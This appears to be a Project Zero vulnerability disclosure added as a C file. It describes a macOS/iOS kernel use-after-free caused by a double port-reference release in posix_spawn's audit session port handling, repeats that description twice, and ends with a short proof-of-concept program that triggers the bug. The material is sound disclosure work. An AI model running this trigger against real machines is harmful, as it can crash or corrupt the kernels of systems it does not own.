@@ -1,0 +1,70 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1104
+
+exec_handle_port_actions is responsible for handling the xnu port actions extension to posix_spawn.
+
+It supports 4 different types of port (PSPA_SPECIAL, PSPA_EXCEPTION, PSPA_AU_SESSION and PSPA_IMP_WATCHPORTS)
+
+For the special, exception and audit ports it tries to update the new task to reflect the port action
+by calling either task_set_special_port, task_set_exception_ports or audit_session_spawnjoin and if
+any of those calls fail it calls ipc_port_release_send(port).
+
+task_set_special_port and task_set_exception_ports don't drop a reference on the port if they fail
+but audit_session_spawnjoin (which calls to audit_session_join_internal) *does* drop a reference on
+the port on failure. It's easy to make audit_session_spawnjoin fail by specifying a port which isn't
+an audit session port.
+
+This means we can cause two references to be dropped on the port when only one is held leading to a
+use after free in the kernel.
+
+Tested on MacOS 10.12.3 (16D32) on MacBookAir5,2
+*/
+
+// ianbeer
+#if 0
+MacOS/iOS kernel uaf due to double-release in posix_spawn
+
+exec_handle_port_actions is responsible for handling the xnu port actions extension to posix_spawn.
+
+It supports 4 different types of port (PSPA_SPECIAL, PSPA_EXCEPTION, PSPA_AU_SESSION and PSPA_IMP_WATCHPORTS)
+
+For the special, exception and audit ports it tries to update the new task to reflect the port action
+by calling either task_set_special_port, task_set_exception_ports or audit_session_spawnjoin and if
+any of those calls fail it calls ipc_port_release_send(port).
+
+task_set_special_port and task_set_exception_ports don't drop a reference on the port if they fail
+but audit_session_spawnjoin (which calls to audit_session_join_internal) *does* drop a reference on
+the port on failure. It's easy to make audit_session_spawnjoin fail by specifying a port which isn't
+an audit session port.
+
+This means we can cause two references to be dropped on the port when only one is held leading to a
+use after free in the kernel.
+
+Tested on MacOS 10.12.3 (16D32) on MacBookAir5,2
+#endif
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <spawn.h>
+
+#include <mach/mach.h>
+
+int main() {
+
+  mach_port_t p = MACH_PORT_NULL;
+  mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p);
+  mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);
+
+  posix_spawnattr_t attrs;
+  posix_spawnattr_init(&attrs);
+  posix_spawnattr_setauditsessionport_np(&attrs,p);
+
+  char* _argv[] = {"/usr/bin/id", NULL};
+  int child_pid = 0;
+  int spawn_err = posix_spawn(&child_pid,
+                              "/usr/bin/id",
+                              NULL, // file actions
+                              &attrs,
+                              _argv,
+                              NULL);
+}
